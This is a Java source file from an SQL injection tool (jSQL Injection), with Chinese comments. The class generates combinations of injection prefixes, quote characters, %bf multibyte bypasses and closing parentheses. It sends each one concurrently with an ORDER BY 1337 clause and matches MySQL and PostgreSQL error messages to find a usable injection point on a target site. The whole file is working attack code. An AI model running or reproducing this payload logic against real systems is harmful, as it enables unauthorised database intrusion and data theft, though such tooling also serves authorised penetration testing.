package com.jsql.model.suspendable;

import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.i18n.I18n;
import com.jsql.model.InjectionModel;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;

/**
 * 执行类，定义要在注入期间使用的插入字符，
  *即-1在“ [..].php？id = -1联合选择[..]”中，有时为-1、0'，0等。
  *当源中出现错误消息时，查找有效的插入字符。
  *如果没有插入字符，并且用户没有输入值，则强制为1，如果没有插入字符，则强制使用用户的值，否则强制插入char。
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    

    private static final Logger LOGGER = Logger.getRootLogger();

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }


    @SuppressWarnings("unchecked")
    @Override
    public String run(Object... args) throws JSqlException {
        
        String characterInsertionByUser = (String) args[0];
        SimpleEntry<String, String> parameterToInject = (SimpleEntry<String, String>) args[1];
        boolean isJson = (boolean) args[2];

        //并行进行搜索，并在需要时让用户停止该过程。
        // SQL：使用不存在的列强制执行错误的ORDER BY子句:order by 1337，
        //，然后检查服务器是否发送了正确的错误消息：order子句'中的未知列'1337'或提供的参数不是有效的MySQL结果资源
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        List<String> charactersInsertion = new ArrayList<>();
        for (String prefix: new String[]{"-1", "0", "1", ""}) {
            for (String suffix: new String[]{
                "*",
                "*'", "'*'",
                "*\"", "\"*\"",
                "*%bf'", "%bf'*%bf'",
                "*%bf\"", "%bf\"*%bf\""
            }) {
                for (String suffix2: new String[]{"", ")", "))"}) {
                    charactersInsertion.add(suffix.replace("*", prefix) + suffix2);
                }
            }
        }
        
        for (String insertionCharacter: charactersInsertion) {
            taskCompletionService.submit(
                new CallablePageSource(
                    insertionCharacter
                    + " "
                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
                    insertionCharacter,
                    this.injectionModel
                )
            );
        }

        String characterInsertion = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    // the correct character: mysql
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() ||
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches() ||

                    // the correct character: postgresql
                    Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    characterInsertion = currentCallable.getInsertionCharacter();
                    break;
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while defining character injection", e);
                Thread.currentThread().interrupt();
            }
            
        }
        
        if (characterInsertion == null) {
            if ("".equals(characterInsertionByUser) || characterInsertionByUser == null || "*".equals(characterInsertionByUser)) {
                characterInsertion = "1";
            } else {
                characterInsertion = characterInsertionByUser;
            }
            LOGGER.warn("No character insertion activates ORDER BY error, forcing to ["+ characterInsertion.replace(InjectionModel.STAR, "") +"]");
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, "").equals(characterInsertion)) {
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
            LOGGER.debug("在检测 ORDER BY上的错误注入时，发现可插入字符 ["+ characterInsertion +"] 代替 ["+ characterInsertionByUserFormat +"] ;");
            //更新备注
            Request updateRemark = new Request();
            updateRemark.setMessage(Interaction.UPDATE_INJECTION_REMARK_DB);
            updateRemark.setParameters("在检测 ORDER BY上的错误注入时，发现可插入字符 ["+ characterInsertion +"] 代替 ["+ characterInsertionByUserFormat +"]",
            		this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlByUser());
            this.injectionModel.sendToViews(updateRemark);
            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
        }
        
        if (!isJson) {
            characterInsertion = characterInsertion.replace(InjectionModel.STAR, "") + InjectionModel.STAR;
        }
        
        parameterToInject.setValue(characterInsertion);

        // TODO optional
        return characterInsertion;
    }
    
}